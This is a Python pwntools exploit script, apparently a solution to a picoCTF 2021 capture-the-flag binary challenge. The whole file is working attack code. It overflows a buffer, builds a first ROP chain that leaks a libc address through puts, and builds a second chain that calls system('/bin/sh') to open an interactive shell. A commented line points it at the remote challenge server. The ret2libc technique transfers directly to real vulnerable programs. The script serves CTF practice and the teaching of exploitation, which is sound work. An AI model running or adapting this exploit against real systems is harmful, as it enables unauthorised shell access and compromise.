from pwn import *

io = process('./vuln')
#io = remote('mercury.picoctf.net', 62289)
elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)

binsh_addr = list(libc.search('/bin/sh'))[0]
system_addr = libc.symbols['system']
puts_addr = libc.symbols['puts']

puts_elf = elf.plt['puts']
puts_got_elf = elf.got['puts']
main_elf = elf.symbols['main']

rop_pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
RET = (rop.find_gadget(['ret']))[0]

banner = "WeLcOmE To mY EcHo sErVeR!\n"

JUNK = "A"*136
rop1 = JUNK
rop1 += p64(rop_pop_rdi)
rop1 += p64(puts_got_elf)
rop1 += p64(puts_elf)
rop1 += p64(main_elf)

io.sendlineafter(banner, rop1)
print(io.recvline())
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
#print hex(leak)

base = leak - puts_addr
#print 'Base:'+hex(base)

'''
Added one more RET in ROP2!!!
This problem arises due to alternative stack alignments in Ubuntu 18.04. The way to get around this is to identify a simple ret address within the binary, and use that to re-align the stack before sending the second ROPChain.
'''
#https://in-spired.xyz/picoctf-2021-binary-exploitation/#here-s-a-libc
#https://ropemporium.com/guide.html#Common%20pitfalls

rop2 = JUNK
rop2 += p64(RET)
rop2 += p64(rop_pop_rdi)
rop2 += p64(base+binsh_addr)
rop2 += p64(base+system_addr)

io.sendlineafter(banner, rop2)
io.interactive()
